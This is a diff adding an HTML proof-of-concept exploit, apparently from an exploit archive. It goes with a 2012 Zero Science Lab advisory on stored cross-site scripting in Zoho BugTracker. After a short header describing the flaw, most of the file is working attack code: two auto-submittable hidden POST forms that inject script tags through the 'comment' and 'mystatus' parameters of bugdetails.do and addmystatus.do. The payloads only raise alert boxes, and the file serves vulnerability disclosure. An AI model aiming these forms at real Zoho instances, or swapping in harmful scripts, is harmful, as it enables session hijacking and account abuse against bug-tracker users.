@@ -1,0 +1,71 @@
+<!--
+
+Zoho BugTracker Multiple Stored XSS Vulnerabilities
+
+
+Vendor: Zoho Corporation Pvt. Ltd
+Product web page: http://www.zoho.com
+Affected version: N/A
+
+Summary: Zoho Bug Tracker is an online bug tracking software that
+combines a clean and an intuitive interface to submit and track bugs
+with custom workflows, business rules, custom fields and filters for
+the bugs that software projects are bound to generate and fix all bugs
+fast.
+
+Desc: The Bug Tracking Software suffers from a stored XSS vulnerability
+when parsing user input to the 'comment' and 'mystatus' parameters via
+POST method thru 'bugdetails.do' and 'addmystatus.do' scripts. Attackers
+can exploit these weaknesses to execute arbitrary HTML and script code
+in a user's browser session.
+
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2012-5096
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5096.php
+
+
+06.08.2012
+
+-->
+
+
+<html>
+<title>Zoho BugTracker Multiple Stored XSS Vulnerabilities</title>
+<body bgcolor="#000000">
+<script type="text/javascript">
+function xss1(){document.forms["xss1"].submit();}
+function xss2(){document.forms["xss2"].submit();}
+</script>
+
+<form action="https://[HOST]/portal/[USER]/bugdetails.do?action=addcomment" enctype="application/x-www-form-urlencoded" method="POST" id="xss1">
+<input type="hidden" name="action" value="addcomment" />
+<input type="hidden" name="projId" value="478405000000013273" />
+<input type="hidden" name="issueId" value="478405000000013347" />
+<input type="hidden" name="zpcp" value="1f91d0fa-9a61-4aab-898c-f023ac4c44fc" />
+<input type="hidden" name="fromPage" value="bugcomments" />
+<input type="hidden" name="comment" value='"><script>alert(1);</script>' />
+<input type="hidden" name="uploadfile" value="" />
+</form>
+
+<form action="https://[HOST]/portal/[USER]/addmystatus.do" enctype="application/x-www-form-urlencoded" method="POST" id="xss2">
+<input type="hidden" name="mystatus" value='"><script>alert(2);</script>' />
+<input type="hidden" name="projId" value="478405000000013273" />
+<input type="hidden" name="targetid" value="latestactivity" />
+<input type="hidden" name="zpcp" value="1f91d0fa-9a61-4aab-898c-f023ac4c44fc" />
+</form><center>
+
+<a href="javascript: xss1();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 1</h3></font></b></a><br />
+
+<a href="javascript: xss2();" style="text-decoration:none">
+<b><font color="red"><h3>XSS 2</h3></font></b></a><br />
+
+</center></body>
+</html>
